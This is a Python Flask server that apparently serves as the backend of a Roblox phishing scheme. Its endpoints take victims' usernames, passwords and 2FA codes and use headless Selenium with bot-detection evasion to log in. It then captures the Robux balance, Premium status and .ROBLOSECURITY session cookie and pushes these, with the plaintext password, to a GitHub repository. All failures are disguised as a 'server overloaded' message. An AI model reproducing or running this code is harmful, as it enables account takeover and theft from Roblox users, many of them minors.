import os
import logging
import random
import string
import time
from datetime import datetime
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException, TimeoutException
import git
import json
from flask_cors import CORS

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Configuration
CONFIG = {
    'ORDERS_REPO': f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git",
    'ORDERS_DIR': "orders",
    'SCREENSHOT_DIR': "screenshots",
    'MAX_LOGIN_ATTEMPTS': 3,
    'REQUEST_TIMEOUT': 30,
    'CHROME_PATHS': [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/local/bin/chromium"
    ]
}

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@app.after_request
def after_request(response):
    """Add CORS headers to all responses"""
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def install_chrome():
    """Install Chrome browser on Render"""
    try:
        logger.info("Starting Chrome installation...")
        
        # Install dependencies
        os.system("apt-get update -y")
        os.system("apt-get install -y wget unzip gnupg")
        
        # Add Google Chrome repository
        os.system("wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | apt-key add -")
        os.system('echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list')
        
        # Install Chrome
        os.system("apt-get update -y")
        os.system("apt-get install -y google-chrome-stable")
        
        # Verify installation
        for path in CONFIG['CHROME_PATHS']:
            if os.path.exists(path):
                logger.info(f"Chrome successfully installed at {path}")
                return True
        
        logger.error("Chrome installation failed - binary not found")
        return False
        
    except Exception as e:
        logger.error(f"Chrome installation error: {str(e)}")
        return False

def get_chrome_options():
    """Configure Chrome options for Selenium"""
    options = Options()
    
    # Find Chrome binary
    for path in CONFIG['CHROME_PATHS']:
        if os.path.exists(path):
            options.binary_location = path
            break
    else:
        logger.warning("Chrome binary not found, attempting installation...")
        if not install_chrome():
            raise RuntimeError("Failed to install Chrome")
    
    # Chrome configuration
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    # Randomize user agent
    chrome_version = random.randint(100, 115)
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    options.add_argument(f"user-agent={user_agent}")
    
    return options

def init_repository():
    """Initialize or update the git repository"""
    try:
        if os.path.exists(os.path.join(CONFIG['ORDERS_DIR'], '.git')):
            repo = git.Repo(CONFIG['ORDERS_DIR'])
            repo.git.pull()
            logger.info("Repository updated")
        else:
            if os.path.exists(CONFIG['ORDERS_DIR']):
                for item in os.listdir(CONFIG['ORDERS_DIR']):
                    item_path = os.path.join(CONFIG['ORDERS_DIR'], item)
                    if os.path.isfile(item_path) and item != '.git':
                        os.remove(item_path)
            
            repo_url = f"https://{os.getenv('GITHUB_USERNAME')}:{os.getenv('GITHUB_TOKEN')}@{CONFIG['ORDERS_REPO'].split('https://')[1]}"
            git.Repo.clone_from(repo_url, CONFIG['ORDERS_DIR'])
            logger.info("Repository cloned")
        return True
    except Exception as e:
        logger.error(f"Repository error: {str(e)}")
        return False

def save_account_data(data):
    """Save account data to repository"""
    try:
        if not init_repository():
            return False
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        filename = f"account_{timestamp}_{rand_str}.json"
        filepath = os.path.join(CONFIG['ORDERS_DIR'], filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        repo = git.Repo(CONFIG['ORDERS_DIR'])
        repo.git.add(filepath)
        repo.index.commit(f"Add account {filename}")
        origin = repo.remote(name='origin')
        origin.push()
        
        logger.info(f"Data saved to {filename}")
        return True
    except Exception as e:
        logger.error(f"Data save error: {str(e)}")
        return False

def human_like_delay(min_sec=0.1, max_sec=0.5):
    """Simulate human-like delay"""
    time.sleep(random.uniform(min_sec, max_sec))

def process_login(username, password, code_2fa=None):
    """Process Roblox login"""
    driver = None
    try:
        # Initialize Chrome driver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=get_chrome_options())
        
        # Remove headless detection
        driver.execute_cdp_cmd("Network.setUserAgentOverride", {
            "userAgent": driver.execute_script("return navigator.userAgent;").replace("Headless", "")
        })
        
        # Login process
        driver.get("https://www.roblox.com/login")
        human_like_delay(1, 2)
        
        # Handle cookies
        try:
            cookie_btn = WebDriverWait(driver, 3).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept')]")))
            cookie_btn.click()
            human_like_delay()
        except:
            pass
        
        # Fill credentials
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login-username")))
        username_field.send_keys(username)
        human_like_delay()
        
        password_field = driver.find_element(By.ID, "login-password")
        password_field.send_keys(password)
        human_like_delay()
        
        login_btn = driver.find_element(By.ID, "login-button")
        login_btn.click()
        human_like_delay(1, 2)
        
        # Handle 2FA if provided
        if code_2fa:
            try:
                code_field = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
                code_field.send_keys(code_2fa)
                human_like_delay()
                
                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
                submit_btn.click()
                human_like_delay(2, 3)
            except Exception as e:
                return {'status': '2fa_error', 'message': f'2FA error: {str(e)}'}
        
        # Verify successful login
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
            
            account_data = {
                'username': username,
                'password': password,
                'status': 'active',
                'robux': get_robux_balance(driver),
                'premium': check_premium_status(driver),
                'cookie': driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else None,
                'timestamp': datetime.now().isoformat()
            }
            
            return {'status': 'success', 'data': account_data}
            
        except TimeoutException:
            error_msg = check_for_errors(driver)
            if error_msg:
                return {'status': 'error', 'message': error_msg}
            
            return {'status': 'unknown_error', 'message': 'Unknown error'}
            
    except Exception as e:
        logger.error(f"Critical error: {str(e)}")
        return {'status': 'critical_error', 'message': str(e)}
    finally:
        if driver:
            driver.quit()

def get_robux_balance(driver):
    """Get Robux balance from account"""
    try:
        driver.get("https://www.roblox.com/transactions")
        balance = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'robux-balance')]"))).text
        return balance.strip()
    except:
        return "0"

def check_premium_status(driver):
    """Check if account has Premium"""
    try:
        driver.get("https://www.roblox.com/premium/membership")
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'premium-icon')]")))
        return True
    except:
        return False

def check_for_errors(driver):
    """Check for login errors"""
    error_messages = [
        "incorrect username or password",
        "account locked",
        "verification required"
    ]
    
    page_text = driver.page_source.lower()
    for msg in error_messages:
        if msg in page_text:
            return msg.capitalize()
    
    return None

# API Endpoints
@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Service is running"})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@app.route('/process_login', methods=['POST'])
def handle_login():
    """Handle login request"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200

    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing credentials'}), 400
    
    logger.info(f"Processing login for: {username}")
    
    try:
        result = process_login(username, password)
        
        if result['status'] == 'success':
            if not save_account_data(result['data']):
                return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
        
        # Convert all errors to server busy message
        if result['status'] != 'success':
            result = {
                'status': 'server_busy',
                'message': 'The server is overloaded. Please try later'
            }
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Server error: {str(e)}")
        return jsonify({
            'status': 'server_busy',
            'message': 'The server is overloaded. Please try later'
        })

@app.route('/submit_2fa', methods=['POST'])
def handle_2fa():
    """Handle 2FA submission"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200

    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    
    code = data.get('code')
    username = data.get('username')
    password = data.get('password')
    
    if not all([code, username, password]):
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    logger.info(f"Processing 2FA for: {username}")
    
    try:
        result = process_login(username, password, code)
        
        if result['status'] == 'success':
            if not save_account_data(result['data']):
                return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
        
        if result['status'] != 'success':
            result = {
                'status': 'server_busy',
                'message': 'The server is overloaded. Please try later'
            }
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Server error: {str(e)}")
        return jsonify({
            'status': 'server_busy',
            'message': 'The server is overloaded. Please try later'
        })

@app.before_request
def log_request():
    """Log incoming requests"""
    logger.info(f"Incoming request: {request.method} {request.url}")

if __name__ == '__main__':
    # Verify environment variables
    required_env_vars = ['GITHUB_USERNAME', 'GITHUB_TOKEN']
    for var in required_env_vars:
        if not os.getenv(var):
            logger.error(f"Missing required environment variable: {var}")
            exit(1)
    
    # Install Chrome if not present
    if not any(os.path.exists(p) for p in CONFIG['CHROME_PATHS']):
        logger.info("Chrome not found, installing...")
        if not install_chrome():
            logger.error("Failed to install Chrome. Exiting...")
            exit(1)
    
    # Create directories
    os.makedirs(CONFIG['SCREENSHOT_DIR'], exist_ok=True)
    os.makedirs(CONFIG['ORDERS_DIR'], exist_ok=True)
    
    # Start server
    port = int(os.getenv('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
